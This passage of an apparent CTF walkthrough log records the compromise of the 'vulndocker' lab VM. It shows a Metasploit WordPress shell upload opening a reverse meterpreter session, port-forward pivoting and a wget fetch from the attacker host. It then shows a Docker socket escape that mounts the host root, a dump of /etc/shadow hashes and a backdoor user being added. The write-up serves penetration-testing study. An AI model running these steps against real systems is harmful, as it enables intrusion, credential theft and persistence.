+-rw-r--r-- 1 root root   347700 Feb 15 16:41 libsystemd0_244.3-1_amd64.deb
+
+jeff@kali-Linux:~/Documents/CTFs/Docker$ ls -al
+total 87248
+drwxr-xr-x 3 jeff jeff     4096 Apr  8 01:31 .
+drwxr-xr-x 5 jeff jeff     4096 Apr  7 23:32 ..
+drwxr-xr-x 2 jeff jeff     4096 Apr  8 01:30 docker_deb
+-rw-r--r-- 1 root root 89325749 Apr  8 01:31 docker.tar.gz
+
+
+jeff@kali-Linux:~/Documents/CTFs/Docker$ proxychains scp docker.tar.gz 172.18.0.2:/tmp/
+ProxyChains-3.1 (http://proxychains.sf.net)
+|S-chain|-<>-127.0.0.1:8080-<><>-172.18.0.2:22-<><>-OK
+lost connection
+
+
+
+=> The copy of the docker binary file via proxychains and reGeorg keep failing (lost connection) so I used a meterpreter shell with a portfwd rule: 
+
+
+msf5 exploit(unix/webapp/wp_admin_shell_upload) > options
+
+Module options (exploit/unix/webapp/wp_admin_shell_upload):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   PASSWORD   Welcome1         yes       The WordPress password to authenticate with
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     192.168.1.9      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT      8000             yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       The base path to the wordpress application
+   USERNAME   bob              yes       The WordPress username to authenticate with
+   VHOST                       no        HTTP server virtual host
+
+
+Exploit target:
+   Id  Name
+   --  ----
+   0   WordPress
+
+
+msf5 exploit(unix/webapp/wp_admin_shell_upload) > run
+
+[*] Started reverse TCP handler on 192.168.1.34:4444 
+[*] Authenticating with WordPress using bob:Welcome1...
+[+] Authenticated with WordPress
+[*] Preparing payload...
+[*] Uploading payload...
+[*] Executing the payload at /wp-content/plugins/KzEvqbSLMZ/czIlONtMPH.php...
+[*] Sending stage (38288 bytes) to 192.168.1.9
+[*] Meterpreter session 1 opened (192.168.1.34:4444 -> 192.168.1.9:44526) at 2020-04-08 02:36:21 +0200
+[+] Deleted czIlONtMPH.php
+[+] Deleted KzEvqbSLMZ.php
+[+] Deleted ../KzEvqbSLMZ
+
+meterpreter > ls
+
+meterpreter > portfwd add -l 9999 -p 22 -r 172.18.0.4
+[*] Local TCP relay created: :9999 <-> 172.18.0.4:22
+
+meterpreter > background
+[*] Backgrounding session 1...
+
+msf5 exploit(unix/webapp/wp_admin_shell_upload) > back
+
+msf5 >  ssh root@127.0.0.1 -p 9999
+[*] exec: ssh root@127.0.0.1 -p 9999
+
+The authenticity of host '[127.0.0.1]:9999 ([127.0.0.1]:9999)' can't be established.
+RSA key fingerprint is SHA256:ZDiL5/w1PFnaWvEKWM6N7Jzsz/FqPMM1SpLbbDUUtSQ.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[127.0.0.1]:9999' (RSA) to the list of known hosts.
+
+ ###############################################################
+ ## Docker SSH ~ Because every container should be accessible ##
+ ###############################################################
+ ## container | content_db_1                                  ##
+ ###############################################################
+
+/ $ 
+/ $ id
+uid=0(root) gid=0(root) groups=0(root)
+
+/ $ bash
+root@13f0a3bb2706:/# 
+
+root@13f0a3bb2706:/# ip a
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default 
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+5: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
+    link/ether 02:42:ac:12:00:02 brd ff:ff:ff:ff:ff:ff
+    inet 172.18.0.2/16 scope global eth0
+       valid_lft forever preferred_lft forever
+
+
+
+msf5 > scp -P 9999 netcat_1.10-41.1_all.deb root@127.0.0.1:/tmp/
+[*] exec: scp -P 9999 netcat_1.10-41.1_all.deb root@127.0.0.1:/tmp/
+
+kex_exchange_identification: banner line contains invalid characters
+lost connection
+
+
+=> I got the same error message when I tried to SCP through my meterpreter session. This more likely due to the Docker SSH not accepting my version of SCP (from Kali) but I am not sure.
+
+=> I decided to try to install the tools WGET and Netcat on the Docker SSH to download the docker-ce binary from the Docker SSH instead of trying to upload it on it... 
+
+
+ ###############################################################
+ ## Docker SSH ~ Because every container should be accessible ##
+ ###############################################################
+ ## container | content_db_1                                  ##
+ ###############################################################
+
+
+/ $ apt-get update
+Get:1 http://security.debian.org jessie/updates InRelease [44.9 kB]
+Get:2 http://repo.mysql.com jessie InRelease [28.8 kB]                              
+Ign http://deb.debian.org jessie InRelease                                                        
+Get:3 http://deb.debian.org jessie-updates InRelease [16.3 kB]        
+Get:4 http://deb.debian.org jessie Release.gpg [1652 B]               
+Get:5 http://deb.debian.org jessie Release [77.3 kB] 
+Get:6 http://security.debian.org jessie/updates/main amd64 Packages [955 kB]
+Get:7 http://deb.debian.org jessie-updates/main amd64 Packages [20 B] 
+Ign http://repo.mysql.com jessie InRelease                                     
+Get:8 http://deb.debian.org jessie/main amd64 Packages [9098 kB]
+Get:9 http://repo.mysql.com jessie/mysql-5.7 amd64 Packages [3374 B]
+Fetched 10.2 MB in 1s (6651 kB/s)                        
+Reading package lists... Done
+W: GPG error: http://repo.mysql.com jessie InRelease: The following signatures were invalid: KEYEXPIRED 1550412832 KEYEXPIRED 1550412832 KEYEXPIRED 1550412832
+
+
+/ $ apt-get install netcat   
+Reading package lists... Done
+Building dependency tree       
+Reading state information... Done
+The following extra packages will be installed:
+  netcat-traditional
+The following NEW packages will be installed:
+  netcat netcat-traditional
+0 upgraded, 2 newly installed, 0 to remove and 45 not upgraded.
+Need to get 75.3 kB of archives.
+After this operation, 194 kB of additional disk space will be used.
+Do you want to continue? [Y/n] Y
+Get:1 http://deb.debian.org/debian/ jessie/main netcat-traditional amd64 1.10-41 [66.3 kB]
+Get:2 http://deb.debian.org/debian/ jessie/main netcat all 1.10-41 [8962 B]
+Fetched 75.3 kB in 0s (1269 kB/s)
+debconf: delaying package configuration, since apt-utils is not installed
+Selecting previously unselected package netcat-traditional.
+(Reading database ... 9267 files and directories currently installed.)
+Preparing to unpack .../netcat-traditional_1.10-41_amd64.deb ...
+Unpacking netcat-traditional (1.10-41) ...
+Selecting previously unselected package netcat.
+Preparing to unpack .../netcat_1.10-41_all.deb ...
+Unpacking netcat (1.10-41) ...
+Setting up netcat-traditional (1.10-41) ...
+update-alternatives: using /bin/nc.traditional to provide /bin/nc (nc) in auto mode
+Setting up netcat (1.10-41) ...
+
+
+/ $ apt-get install wget   
+Reading package lists... Done
+Building dependency tree       
+Reading state information... Done
+The following extra packages will be installed:
+  ca-certificates libffi6 libgmp10 libgnutls-deb0-28 libhogweed2 libicu52 libidn11 libnettle4
+  libp11-kit0 libpsl0 libtasn1-6
+Suggested packages:
+  gnutls-bin
+The following NEW packages will be installed:
+  ca-certificates libffi6 libgmp10 libgnutls-deb0-28 libhogweed2 libicu52 libidn11 libnettle4
+  libp11-kit0 libpsl0 libtasn1-6 wget
+0 upgraded, 12 newly installed, 0 to remove and 45 not upgraded.
+Need to get 9106 kB of archives.
+After this operation, 35.2 MB of additional disk space will be used.
+Do you want to continue? [Y/n] Y
+Get:1 http://security.debian.org/ jessie/updates/main libgnutls-deb0-28 amd64 3.3.30-0+deb8u1 [749 kB]
+Get:2 http://deb.debian.org/debian/ jessie/main libgmp10 amd64 2:6.0.0+dfsg-6 [253 kB]
+Get:3 http://security.debian.org/ jessie/updates/main libidn11 amd64 1.29-1+deb8u3 [137 kB]
+Get:4 http://security.debian.org/ jessie/updates/main libicu52 amd64 52.1-8+deb8u8 [6791 kB]
+Get:5 http://deb.debian.org/debian/ jessie/main libnettle4 amd64 2.7.1-5+deb8u2 [176 kB]
+Get:6 http://deb.debian.org/debian/ jessie/main libhogweed2 amd64 2.7.1-5+deb8u2 [125 kB]
+Get:7 http://deb.debian.org/debian/ jessie/main libffi6 amd64 3.1-2+deb8u1 [20.2 kB]
+Get:8 http://deb.debian.org/debian/ jessie/main libp11-kit0 amd64 0.20.7-1 [81.2 kB]
+Get:9 http://deb.debian.org/debian/ jessie/main libtasn1-6 amd64 4.2-3+deb8u3 [49.2 kB]
+Get:10 http://deb.debian.org/debian/ jessie/main libpsl0 amd64 0.5.1-1 [41.6 kB]
+Get:11 http://security.debian.org/ jessie/updates/main wget amd64 1.16-1+deb8u7 [496 kB]
+Get:12 http://security.debian.org/ jessie/updates/main ca-certificates all 20141019+deb8u4 [185 kB]
+<SNIP>
+
+/ $ 
+
+/ $ cd /tmp/                                                     
+/tmp $ wget http://192.168.1.34:8000/docker.tar.gz
+converted 'http://192.168.1.34:8000/docker.tar.gz' (ANSI_X3.4-1968) -> 'http://192.168.1.34:8000/docker.tar.gz' (UTF-8)
+--2020-04-08 01:33:36--  http://192.168.1.34:8000/docker.tar.gz
+Connecting to 192.168.1.34:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 89325749 (85M) [application/gzip]
+Saving to: 'docker.tar.gz'
+docker.tar.gz            100%[===================================>]  85.19M  6.65MB/s   in 14s    
+2020-04-08 01:33:50 (6.24 MB/s) - 'docker.tar.gz' saved [89325749/89325749]
+
+
+/tmp $ tar xvzf docker.tar.gz
+./
+./iptables_1.8.4-3_amd64.deb
+./libseccomp2_2.4.3-1_amd64.deb
+./libdevmapper1.02.1_2%3a1.02.167-1+b1_amd64.deb
+./libc6_2.30-2_amd64.deb
+./docker-ce-cli_5%3a19.03.8~3-0~debian-buster_amd64.deb
+./docker-ce_5%3a19.03.8~3-0~debian-buster_amd64.deb
+./libsystemd0_244.3-1_amd64.deb
+./containerd.io_1.2.13-1_amd64.deb
+
+
+/tmp $ dpkg -i *.deb
+Selecting previously unselected package containerd.io.
+(Reading database ... 9643 files and directories currently installed.)
+Preparing to unpack containerd.io_1.2.13-1_amd64.deb ...
+
+
+=> We can now use the Docker client :-)
+
+$ bash
+root@13f0a3bb2706:/tmp#
+
+
+=> Display docker information
+------------------------------
+
+root@13f0a3bb2706:/tmp# docker info
+Client:
+ Debug Mode: false
+
+Server:
+ Containers: 3
+  Running: 3
+  Paused: 0
+  Stopped: 0
+ Images: 3
+ Server Version: 17.06.0-ce
+ Storage Driver: aufs
+  Root Dir: /var/lib/docker/aufs
+  Backing Filesystem: extfs
+  Dirs: 38
+  Dirperm1 Supported: false
+ Logging Driver: json-file
+ Cgroup Driver: cgroupfs
+ Plugins:
+  Volume: local
+  Network: bridge host macvlan null overlay
+  Log: awslogs fluentd gcplogs gelf journald json-file logentries splunk syslog
+ Swarm: inactive
+ Runtimes: runc
+ Default Runtime: runc
+ Init Binary: docker-init
+ containerd version: cfb82a876ecc11b5ca0977d1733adbe58599088a
+ runc version: 2d41c047c83e09a6d61d464906feb2a2f3c52aa4
+ init version: 949e6fa
+ Security Options:
+  apparmor
+ Kernel Version: 3.13.0-128-generic
+ Operating System: Ubuntu 14.04 LTS
+ OSType: linux
+ Architecture: x86_64
+ CPUs: 1
+ Total Memory: 993.9MiB
+ Name: vulndocker
+ ID: GLP6:OT5L:SYVE:BX54:BVOU:BQQ3:CQID:KXTQ:ERTV:4JH6:QL7T:OTLL
+ Docker Root Dir: /var/lib/docker
+ Debug Mode: false
+ Registry: https://index.docker.io/v1/
+ Experimental: false
+ Insecure Registries:
+  127.0.0.0/8
+ Live Restore Enabled: false
+
+WARNING: No swap limit support
+
+
+=> List the docker images
+--------------------------
+
+root@13f0a3bb2706:/tmp# docker images
+REPOSITORY                 TAG                 IMAGE ID            CREATED             SIZE
+wordpress                  latest              c4260b289fc7        2 years ago         406MB
+mysql                      5.7                 c73c7527c03a        2 years ago         412MB
+jeroenpeeters/docker-ssh   latest              7d3ecb48134e        2 years ago         43.2MB
+
+
+
+=> List the docker containers/images which are running. There are 3 docker containers: WordPress, MySQL database and Docker-ssh proxy.
+---------------------------------------------------------------------------------------------------------------------------------------
+
+root@13f0a3bb2706:/tmp# docker ps
+CONTAINER ID        IMAGE                      COMMAND                  CREATED             STATUS              PORTS                  NAMES
+8f4bca8ef241        wordpress:latest           "docker-entrypoint.s…"   2 years ago         Up 19 minutes       0.0.0.0:8000->80/tcp   content_wordpress_1
+13f0a3bb2706        mysql:5.7                  "docker-entrypoint.s…"   2 years ago         Up 19 minutes       3306/tcp               content_db_1
+b90babce1037        jeroenpeeters/docker-ssh   "npm start"              2 years ago         Up 19 minutes       22/tcp, 8022/tcp       content_ssh_1
+
+
+
+=> List docker networks
+------------------------
+
+root@13f0a3bb2706:/tmp# docker network ls
+NETWORK ID          NAME                DRIVER              SCOPE
+4bb60c3a6ba2        bridge              bridge              local
+19017deceb88        content_default     bridge              local
+e59e8190c373        host                host                local
+695bf0a5f54f        none                null                local
+
+
+=> Inspect custom docker networks
+----------------------------------
+
+root@13f0a3bb2706:/tmp# docker network inspect content_default
+[
+    {
+        "Name": "content_default",
+        "Id": "19017deceb88f158f543b160620c380ebcc681924b94b4eafb4e73fe3b7b9a70",
+        "Created": "2017-08-16T18:27:20.828213539+01:00",
+        "Scope": "local",
+        "Driver": "bridge",
+        "EnableIPv6": false,
+        "IPAM": {
+            "Driver": "default",
+            "Options": null,
+            "Config": [
+                {
+                    "Subnet": "172.18.0.0/16",
+                    "Gateway": "172.18.0.1"
+                }
+            ]
+        },
+        "Internal": false,
+        "Attachable": false,
+        "Ingress": false,
+        "ConfigFrom": {
+            "Network": ""
+        },
+        "ConfigOnly": false,
+        "Containers": {
+            "13f0a3bb27069c58d328761a5202423bee3cdcdade0dfd4a9648d30d3ac20215": {
+                "Name": "content_db_1",
+                "EndpointID": "e031925fa290399783df839cdc4da7070c9204083e5d0c3970f9677e0e7c4740",
+                "MacAddress": "02:42:ac:12:00:04",
+                "IPv4Address": "172.18.0.4/16",
+                "IPv6Address": ""
+            },
+            "8f4bca8ef241501721a6d88b3c1a9b7432f19b2d4b389a11bfe68b770366a669": {
+                "Name": "content_wordpress_1",
+                "EndpointID": "102478a4344d8e00d6ba5a95ceb502334c720d68cafbe7c09b859fa877429b82",
+                "MacAddress": "02:42:ac:12:00:02",
+                "IPv4Address": "172.18.0.2/16",
+                "IPv6Address": ""
+            },
+            "b90babce10373b0d226169d8ccaa256aaf457fa70d6f392159ae8e331f967106": {
+                "Name": "content_ssh_1",
+                "EndpointID": "119db72b92ac539b569df28a4b36951b251a7abb739596a72353d16afedb1b0b",
+                "MacAddress": "02:42:ac:12:00:03",
+                "IPv4Address": "172.18.0.3/16",
+                "IPv6Address": ""
+            }
+        },
+        "Options": {},
+        "Labels": {}
+    }
+]
+root@13f0a3bb2706:/tmp# 
+
+
+=> Execute commands as ROOT on all the docker containers/images :-)
+---------------------------------------------------------------------
+
+root@13f0a3bb2706:/tmp# docker exec -it 8f4bca8ef241 hostname
+8f4bca8ef241
+
+root@13f0a3bb2706:/tmp# docker exec -it 8f4bca8ef241 id
+uid=0(root) gid=0(root) groups=0(root)
+
+
+root@13f0a3bb2706:/tmp# docker exec -it b90babce1037 hostname
+b90babce1037
+
+root@13f0a3bb2706:/tmp# docker exec -it b90babce1037 id      
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+root@13f0a3bb2706:/tmp# 
+
+
+=> Take over the Linux server hosting the docker containers by running a Wordpress container with a volume pointing to the root folder of the hosting server
+-------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+root@13f0a3bb2706:/tmp# docker -H unix:///var/run/docker.sock run --rm -it -v /:/host wordpress chroot /host bash
+
+root@358d18a69d22:/# 
+
+root@358d18a69d22:/# uname -a
+Linux 358d18a69d22 3.13.0-128-generic #177-Ubuntu SMP Tue Aug 8 11:40:23 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
+
+root@358d18a69d22:/# cat /etc/shadow
+root:$6$i8GUrrmW$GE/x1EEwKgMvvTS0IuOfd4jkrP9ufQrYxBdvAXh72ETmC.PZv.0gzb9Fxfs2y5CxmKiJlRUJVr5p0k3TxgPEG0:17394:0:99999:7:::
+daemon:*:16176:0:99999:7:::
+bin:*:16176:0:99999:7:::
+sys:*:16176:0:99999:7:::
+sync:*:16176:0:99999:7:::
+games:*:16176:0:99999:7:::
+man:*:16176:0:99999:7:::
+lp:*:16176:0:99999:7:::
+mail:*:16176:0:99999:7:::
+news:*:16176:0:99999:7:::
+uucp:*:16176:0:99999:7:::
+proxy:*:16176:0:99999:7:::
+www-data:*:16176:0:99999:7:::
+backup:*:16176:0:99999:7:::
+list:*:16176:0:99999:7:::
+irc:*:16176:0:99999:7:::
+gnats:*:16176:0:99999:7:::
+nobody:*:16176:0:99999:7:::
+libuuid:!:16176:0:99999:7:::
+syslog:*:16176:0:99999:7:::
+messagebus:*:17392:0:99999:7:::
+landscape:*:17392:0:99999:7:::
+sshd:*:17392:0:99999:7:::
+whale:$6$RvS0tNRs$gV2mxTeBwobOo9h1LZ59aGb1Gy7E83.2Lb5IsmPupTKxLqfoLAMLAKPMskQ1s52puOQoXzuLhrhM.j7TkTAxp1:17394:0:99999:7:::
+
+root@358d18a69d22:/# ls -al
+total 88
+drwxr-xr-x  22 root root  4096 Aug 22  2017 .
+drwxr-xr-x  22 root root  4096 Aug 22  2017 ..
+drwxr-xr-x   2 root root  4096 Aug 16  2017 bin
+drwxr-xr-x   3 root root  4096 Aug 22  2017 boot
+drwxr-xr-x  14 root root  4040 Apr  8 02:18 dev
+drwxr-xr-x  90 root root  4096 Apr  8 02:18 etc
+-r--------   1 root root   414 Aug 21  2017 flag_3
+drwxr-xr-x   4 root root  4096 Aug 16  2017 home
+lrwxrwxrwx   1 root root    34 Aug 16  2017 initrd.img -> boot/initrd.img-3.13.0-128-generic
+drwxr-xr-x  21 root root  4096 Aug 16  2017 lib
+drwxr-xr-x   2 root root  4096 Aug 16  2017 lib64
+drwx------   2 root root 16384 Aug 14  2017 lost+found
+drwxr-xr-x   3 root root  4096 Aug 14  2017 media
+drwxr-xr-x   2 root root  4096 Apr 10  2014 mnt
+drwxr-xr-x   2 root root  4096 Apr 16  2014 opt
+dr-xr-xr-x 102 root root     0 Apr  8 02:18 proc
+drwx------   4 root root  4096 Aug 22  2017 root
+drwxr-xr-x  19 root root   700 Apr  8 02:18 run
+drwxr-xr-x   2 root root  4096 Aug 16  2017 sbin
+drwxr-xr-x   2 root root  4096 Apr 16  2014 srv
+dr-xr-xr-x  13 root root     0 Apr  8 02:18 sys
+drwxrwxrwt   2 root root  4096 Apr  8 03:06 tmp
+drwxr-xr-x  10 root root  4096 Aug 14  2017 usr
+drwxr-xr-x  12 root root  4096 Aug 14  2017 var
+lrwxrwxrwx   1 root root    31 Aug 16  2017 vmlinuz -> boot/vmlinuz-3.13.0-128-generic
+
+
+root@358d18a69d22:/# cat flag_3
+d867a73c70770e73b65e6949dd074285dfdee80a8db333a7528390f6
+
+Awesome so you reached host
+
+Well done
+
+Now the bigger challenge try to understand and fix the bugs.
+
+If you want more attack targets look at the shadow file and try cracking passwords :P
+
+Thanks for playing the challenges we hope you enjoyed all levels
+
+You can send your suggestions bricks bats criticism or appreciations 
+on vulndocker@notsosecure.com 
+root@358d18a69d22:/# 
+
+
+=> I created an account to SSH to be able the Linux server "vulndocker"
+-------------------------------------------------------------------------
+
+root@358d18a69d22:/# useradd pentester
+
+root@358d18a69d22:/# passwd pentester          
+Enter new UNIX password: 
+Retype new UNIX password: 
+passwd: password updated successfully
+
+
+=> Then I logged into the Linux server "vulndocker"
+----------------------------------------------------
+MBP-P3nt3st3r:~ jeff$ ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o GlobalKnownHostsFile=/dev/null pentester@192.168.1.9
+Warning: Permanently added '192.168.1.9' (ECDSA) to the list of known hosts.
+pentester@192.168.1.9's password: 
+Welcome to Ubuntu 14.04 LTS (GNU/Linux 3.13.0-128-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com/
+  System information as of Wed Apr  8 02:18:38 BST 2020
+  System load: 0.0               Memory usage: 5%   Processes:       73
+  Usage of /:  27.5% of 8.73GB   Swap usage:   0%   Users logged in: 0
+  Graph this data and manage this system at:
+    https://landscape.canonical.com/
+
+<SNIP>
+
+Could not chdir to home directory /home/pentester: No such file or directory
+
+$ id
+uid=1002(pentester) gid=1002(pentester) groups=1002(pentester)
+
+
+$ hostname
+vulndocker
+
+
+$ ifconfig
+br-19017deceb88 Link encap:Ethernet  HWaddr 02:42:8c:63:e4:ea  
+          inet addr:172.18.0.1  Bcast:0.0.0.0  Mask:255.255.0.0
+          inet6 addr: fe80::42:8cff:fe63:e4ea/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:7699 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:11175 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:1308479 (1.3 MB)  TX bytes:109858079 (109.8 MB)
+
+docker0   Link encap:Ethernet  HWaddr 02:42:e4:7a:1c:35  
+          inet addr:172.17.0.1  Bcast:0.0.0.0  Mask:255.255.0.0
+          inet6 addr: fe80::42:e4ff:fe7a:1c35/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:8 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:0 (0.0 B)  TX bytes:648 (648.0 B)
+
+eth0      Link encap:Ethernet  HWaddr 08:00:27:d8:45:79  
+          inet addr:192.168.1.9  Bcast:192.168.1.255  Mask:255.255.255.0
+          inet6 addr: fe80::a00:27ff:fed8:4579/64 Scope:Link
+          inet6 addr: 2a01:e35:2fef:d7e0:a00:27ff:fed8:4579/64 Scope:Global
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:80373 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:7979 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:114438293 (114.4 MB)  TX bytes:1521991 (1.5 MB)
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:65536  Metric:1
+          RX packets:16 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:16 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:1184 (1.1 KB)  TX bytes:1184 (1.1 KB)
+
+veth4c5c30e Link encap:Ethernet  HWaddr 06:d5:1c:3c:27:a0  
+          inet6 addr: fe80::4d5:1cff:fe3c:27a0/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:7521 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:7856 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:1510600 (1.5 MB)  TX bytes:1281352 (1.2 MB)
+
+vethacd264e Link encap:Ethernet  HWaddr ae:23:f2:c5:28:c6  
+          inet6 addr: fe80::ac23:f2ff:fec5:28c6/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:4785 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:7095 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:511404 (511.4 KB)  TX bytes:109252077 (109.2 MB)
+
+vethad7d83c Link encap:Ethernet  HWaddr f2:c4:cd:e0:34:b8  
+          inet6 addr: fe80::f0c4:cdff:fee0:34b8/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:3194 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:4070 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:411511 (411.5 KB)  TX bytes:345206 (345.2 KB)
+
+vethf09e7c1 Link encap:Ethernet  HWaddr c2:87:63:b2:a5:9f  
+          inet6 addr: fe80::c087:63ff:feb2:a59f/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:16 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:0 (0.0 B)  TX bytes:1296 (1.2 KB)
+
+
+
+============Others commands ==============
+
+root@358d18a69d22:/# 
+
+root@358d18a69d22:/# ps -ealwf > /tmp/ps-commands.txt
+
+root@358d18a69d22:/# cat /tmp/ps-commands.txt
+
+F S UID        PID  PPID  C PRI  NI ADDR SZ WCHAN  STIME TTY          TIME CMD
+<SNIP>
+1 S root       441     1  0  80   0 -  3854 -      02:18 ?        00:00:00 upstart-file-bridge --daemon
+1 S root       558     1  0  80   0 -  3817 -      02:18 ?        00:00:00 upstart-socket-bridge --daemon
+1 S root       729     1  0  80   0 -  2559 -      02:18 ?        00:00:00 dhclient -1 -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases eth0
+4 S root       822     1  0  80   0 - 121373 -     02:18 ?        00:00:03 /usr/bin/dockerd --raw-logs
+4 S root       845   822  0  80   0 - 114018 -     02:18 ?        00:00:01 docker-containerd -l unix:///var/run/docker/libcontainerd/docker-containerd.sock --metrics-interval=0 --start-timeout 2m --state-dir /var/run/docker/libcontainerd/containerd --shim docker-containerd-shim --runtime docker-runc
+4 S root       915     1  0  80   0 -  3637 -      02:18 tty4     00:00:00 /sbin/getty -8 38400 tty4
+4 S root       918     1  0  80   0 -  3637 -      02:18 tty5     00:00:00 /sbin/getty -8 38400 tty5
+4 S root       923     1  0  80   0 -  3637 -      02:18 tty2     00:00:00 /sbin/getty -8 38400 tty2
+4 S root       924     1  0  80   0 -  3637 -      02:18 tty3     00:00:00 /sbin/getty -8 38400 tty3
+4 S root       926     1  0  80   0 -  3637 -      02:18 tty6     00:00:00 /sbin/getty -8 38400 tty6
+4 S root       952     1  0  80   0 - 15342 -      02:18 ?        00:00:00 /usr/sbin/sshd -D
+1 S daemon     957     1  0  80   0 -  4786 -      02:18 ?        00:00:00 atd
+1 S root       958     1  0  80   0 -  5915 -      02:18 ?        00:00:00 cron
+1 S root       961     1  0  80   0 -  1094 -      02:18 ?        00:00:00 acpid -c /etc/acpi/events -s /var/run/acpid.socket
+4 S root      1038     1  0  80   0 -  3637 -      02:18 tty1     00:00:00 /sbin/getty -8 38400 tty1
+4 S root      1254   822  0  80   0 - 27048 -      02:18 ?        00:00:00 /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 8000 -container-ip 172.18.0.2 -container-port 80
+4 S root      1285   845  0  80   0 - 51827 -      02:18 ?        00:00:00 docker-containerd-shim 8f4bca8ef241501721a6d88b3c1a9b7432f19b2d4b389a11bfe68b770366a669 /var/run/docker/libcontainerd/8f4bca8ef241501721a6d88b3c1a9b7432f19b2d4b389a11bfe68b770366a669 docker-runc
+4 S root      1289   845  0  80   0 - 51827 -      02:18 ?        00:00:00 docker-containerd-shim b90babce10373b0d226169d8ccaa256aaf457fa70d6f392159ae8e331f967106 /var/run/docker/libcontainerd/b90babce10373b0d226169d8ccaa256aaf457fa70d6f392159ae8e331f967106 docker-runc
+4 S root      1290   845  0  80   0 - 51827 -      02:18 ?        00:00:00 docker-containerd-shim 13f0a3bb27069c58d328761a5202423bee3cdcdade0dfd4a9648d30d3ac20215 /var/run/docker/libcontainerd/13f0a3bb27069c58d328761a5202423bee3cdcdade0dfd4a9648d30d3ac20215 docker-runc
+4 S root      1306  1285  0  80   0 - 78767 -      02:18 ?        00:00:00 apache2 -DFOREGROUND
+4 S 999       1332  1290  0  80   0 - 282901 -     02:18 ?        00:00:01 mysqld
+4 S root      1333  1289  0  80   0 - 149017 -     02:18 ?        00:00:00 npm                    
+0 S root      1568  1333  0  80   0 -   378 -      02:18 ?        00:00:00 sh -c ./node_modules/forever/bin/forever -c ./node_modules/coffee-script/bin/coffee server.coffee | ./node_modules/bunyan/bin/bunyan
+0 S root      1569  1568  0  80   0 - 145608 -     02:18 ?        00:00:00 node ./node_modules/forever/bin/forever -c ./node_modules/coffee-script/bin/coffee server.coffee
+0 S root      1570  1568  0  80   0 - 143343 -     02:18 ?        00:00:00 node ./node_modules/bunyan/bin/bunyan
+4 S root      1585  1569  0  80   0 - 149590 -     02:18 ?        00:00:02 node ./node_modules/coffee-script/bin/coffee /src/server.coffee
+5 S www-data  1602  1306  0  80   0 - 98282 -      02:18 ?        00:00:00 apache2 -DFOREGROUND
+5 S www-data  1603  1306  0  80   0 - 99178 -      02:18 ?        00:00:00 apache2 -DFOREGROUND
+5 S www-data  1604  1306  0  80   0 - 79503 -      02:18 ?        00:00:00 apache2 -DFOREGROUND
+5 S www-data  1605  1306  0  80   0 - 79765 -      02:18 ?        00:00:01 apache2 -DFOREGROUND
+5 S www-data  1606  1306  0  80   0 - 80553 -      02:18 ?        00:00:00 apache2 -DFOREGROUND
+5 S www-data  1612  1306  0  80   0 - 78775 -      02:19 ?        00:00:00 apache2 -DFOREGROUND
+4 S root      1615   845  0  80   0 - 51827 -      02:27 ?        00:00:00 docker-containerd-shim 13f0a3bb27069c58d328761a5202423bee3cdcdade0dfd4a9648d30d3ac20215 /var/run/docker/libcontainerd/13f0a3bb27069c58d328761a5202423bee3cdcdade0dfd4a9648d30d3ac20215 docker-runc
+4 S root      1626  1615  0  80   0 -  5069 -      02:27 ?        00:00:00 bash
